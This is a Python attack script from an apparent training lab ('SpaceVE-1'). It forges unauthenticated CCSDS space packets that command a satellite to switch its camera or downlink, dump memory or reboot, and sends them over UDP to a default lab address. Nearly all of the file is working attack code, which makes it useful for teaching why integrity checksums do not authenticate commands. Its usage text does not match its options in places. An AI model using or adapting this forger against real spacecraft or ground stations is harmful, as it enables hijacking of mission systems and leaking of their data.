#!/usr/bin/env python3
"""
ccsds_packet_forge.py — CCSDS Space Packet Forger
SpaceVE-1 Lab Attack Tool

Builds syntactically valid CCSDS Space Packet Protocol (SPP) packets
without any authentication token. Demonstrates the core misconfiguration:
CCSDS checksum validates INTEGRITY (no corruption) but not AUTHENTICITY
(anyone who can compute XOR can forge commands).

Usage:
  python3 ccsds_packet_forge.py nop
  python3 ccsds_packet_forge.py send --cmd nop --ip 192.168.60.100 --port 1234
  python3 ccsds_packet_forge.py send --cmd camera_on
  python3 ccsds_packet_forge.py send --cmd downlink_on
  python3 ccsds_packet_forge.py send --cmd memory_dump
  python3 ccsds_packet_forge.py raw --hex 1A00C0000001 --func 0x02
  python3 ccsds_packet_forge.py list

CCSDS Primary Header (6 bytes):
  Bits 0-2:  Version (000)
  Bit  3:    Type    (1=command, 0=telemetry)
  Bit  4:    Sec Hdr Flag (1=secondary header present)
  Bits 5-15: APID (11 bits, identifies destination app)
  Bits 16-17: Sequence flags (11=standalone)
  Bits 18-31: Sequence count (14 bits)
  Bits 32-47: Data length (payload length - 1)

CCSDS Secondary Header (2 bytes, command packets):
  Bits 0-6: Function code (7 bits)
  Bit  7:   Reserved (0)
  Bits 8-15: Checksum (XOR of all bytes before it XORed against 0xFF)

Attack vector: No cryptographic MAC. The checksum is deterministic and
computable by any attacker. Source IP is not verified by the satellite.
"""

import argparse
import socket
import struct
import sys


SATELLITE_APID = 0x200  # SpaceVE-1 primary app ID

# Known function codes for SpaceVE-1 satellite (from cfs_stub.py)
COMMANDS = {
    "nop":          (0x00, b""),
    "camera_on":    (0x01, b""),
    "camera_off":   (0x02, b""),
    "downlink_on":  (0x03, b""),
    "downlink_off": (0x04, b""),
    "memory_dump":  (0x05, b""),
    "reboot":       (0x06, b""),
}


def ccsds_checksum(sec_byte0: int, user_data: bytes) -> int:
    cksum = 0xFF
    cksum ^= sec_byte0
    for b in user_data:
        cksum ^= b
    return cksum


def build_packet(apid: int, func_code: int, user_data: bytes = b"", seq: int = 0) -> bytes:
    word0 = (0b000 << 13) | (1 << 12) | (1 << 11) | (apid & 0x7FF)
    word1 = (0b11 << 14) | (seq & 0x3FFF)
    data_len = 1 + len(user_data)  # secondary header + user data, minus 1

    primary = struct.pack(">HHH", word0, word1, data_len)

    sec_byte0 = (func_code & 0x7F) << 1
    cksum = ccsds_checksum(sec_byte0, user_data)
    secondary = bytes([sec_byte0, cksum])

    return primary + secondary + user_data


def parse_packet(data: bytes) -> dict:
    if len(data) < 6:
        return {"error": "too short"}
    word0, word1, data_len = struct.unpack(">HHH", data[:6])
    version    = (word0 >> 13) & 0x7
    pkt_type   = (word0 >> 12) & 0x1
    sec_hdr    = (word0 >> 11) & 0x1
    apid       = word0 & 0x7FF
    seq_flags  = (word1 >> 14) & 0x3
    seq_count  = word1 & 0x3FFF
    result = {
        "version": version,
        "type": "command" if pkt_type else "telemetry",
        "sec_hdr": bool(sec_hdr),
        "apid": f"0x{apid:03X}",
        "seq_flags": seq_flags,
        "seq_count": seq_count,
        "data_len_field": data_len,
        "total_bytes": len(data),
    }
    if pkt_type and sec_hdr and len(data) >= 8:
        sec_byte0 = data[6]
        stored_cksum = data[7]
        func_code = (sec_byte0 >> 1) & 0x7F
        user_data = data[8:]
        computed_cksum = ccsds_checksum(sec_byte0, user_data)
        result["func_code"] = f"0x{func_code:02X}"
        result["checksum_stored"] = f"0x{stored_cksum:02X}"
        result["checksum_computed"] = f"0x{computed_cksum:02X}"
        result["checksum_valid"] = stored_cksum == computed_cksum
    return result


def cmd_list(args):
    print("\n  CCSDS SpaceVE-1 Command Reference")
    print("  ====================================")
    print(f"  Satellite APID: 0x{SATELLITE_APID:03X}")
    print()
    print(f"  {'Name':<15} {'Func Code':<12} {'Effect'}")
    print(f"  {'-'*15} {'-'*12} {'-'*40}")
    effects = {
        "nop":          "No operation — heartbeat/test",
        "camera_on":    "Enable imaging payload",
        "camera_off":   "Disable imaging payload",
        "downlink_on":  "Enable telemetry downlink (leaks mission_plan)",
        "downlink_off": "Disable telemetry downlink",
        "memory_dump":  "Dump onboard memory to telemetry",
        "reboot":       "Force satellite reboot",
    }
    for name, (fc, _) in COMMANDS.items():
        pkt = build_packet(SATELLITE_APID, fc)
        print(f"  {name:<15} 0x{fc:02X}         {effects.get(name, '')}")
        print(f"  {'':15} {'hex:':<12} {pkt.hex()}")
    print()


def cmd_forge(args):
    if args.cmd not in COMMANDS:
        print(f"Unknown command: {args.cmd}. Use 'list' to see options.")
        sys.exit(1)
    func_code, user_data = COMMANDS[args.cmd]
    pkt = build_packet(SATELLITE_APID, func_code, user_data)
    print(f"\n  Forged packet: {pkt.hex()}")
    info = parse_packet(pkt)
    for k, v in info.items():
        print(f"    {k}: {v}")
    print()
    return pkt


def cmd_send(args):
    if args.cmd not in COMMANDS:
        print(f"Unknown command: {args.cmd}")
        sys.exit(1)
    func_code, user_data = COMMANDS[args.cmd]
    pkt = build_packet(SATELLITE_APID, func_code, user_data)
    print(f"\n  Sending '{args.cmd}' (func=0x{func_code:02X}) to {args.ip}:{args.port}")
    print(f"  Packet: {pkt.hex()}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(pkt, (args.ip, args.port))
    sock.close()
    print(f"  Sent {len(pkt)} bytes. No authentication required.\n")


def cmd_raw(args):
    apid = int(args.apid, 16) if hasattr(args, 'apid') and args.apid else SATELLITE_APID
    func = int(args.func, 16) if args.func else 0
    data = bytes.fromhex(args.data) if hasattr(args, 'data') and args.data else b""
    pkt = build_packet(apid, func, data)
    print(f"\n  Raw packet (APID=0x{apid:03X}, func=0x{func:02X}): {pkt.hex()}\n")


def main():
    p = argparse.ArgumentParser(description="CCSDS packet forger for SpaceVE-1 lab")
    sub = p.add_subparsers(dest="action")

    sub.add_parser("list", help="List available commands")

    forge_p = sub.add_parser("forge", help="Build and display a packet")
    forge_p.add_argument("--cmd", default="nop", choices=COMMANDS.keys())

    send_p = sub.add_parser("send", help="Build and send a packet")
    send_p.add_argument("--cmd", default="nop", choices=COMMANDS.keys())
    send_p.add_argument("--ip", default="192.168.60.100")
    send_p.add_argument("--port", type=int, default=1234)

    raw_p = sub.add_parser("raw", help="Send custom APID/func code packet")
    raw_p.add_argument("--apid", default=f"0x{SATELLITE_APID:X}")
    raw_p.add_argument("--func", default="0x00")
    raw_p.add_argument("--data", default="")
    raw_p.add_argument("--ip", default="192.168.60.100")
    raw_p.add_argument("--port", type=int, default=1234)

    args = p.parse_args()
    if args.action == "list":
        cmd_list(args)
    elif args.action == "forge":
        cmd_forge(args)
    elif args.action == "send":
        cmd_send(args)
    elif args.action == "raw":
        cmd_raw(args)
    else:
        p.print_help()


if __name__ == "__main__":
    main()
